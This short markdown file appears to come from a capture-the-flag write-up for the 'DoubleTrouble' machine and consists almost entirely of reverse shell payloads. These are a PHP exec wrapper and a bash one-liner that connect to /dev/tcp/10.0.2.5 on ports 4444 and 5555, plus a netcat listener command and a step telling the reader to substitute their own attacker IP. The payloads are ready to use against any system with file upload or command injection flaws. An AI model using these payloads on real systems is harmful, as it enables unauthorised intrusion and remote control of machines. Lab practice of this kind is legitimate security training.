# 💻 Reverse Shell Payloads

This file contains reverse shell payloads used during exploitation of the **DoubleTrouble CTF machine**.

---

## PHP Reverse Shell
Upload or inject this payload into the target system to establish a reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.5/4444 0>&1'");
?>
```
- Replace 10.0.2.5 with your attacker IP.
- Replace 4444 with the port used by your listener.
___
### Netcat Listener
On the attacker machine, start a netcat listener to catch the reverse shell:
```bash
nc -lvnp 4444
```
___
### Alternative Bash One-Liner
If command injection is possible, use this one-liner directly:
```bash
bash -i >& /dev/tcp/10.0.2.5/5555 0>&1
```
___
### Notes
- Ensure your firewall or host machine allows the chosen port.
- Reverse shell execution confirms remote code execution on the target.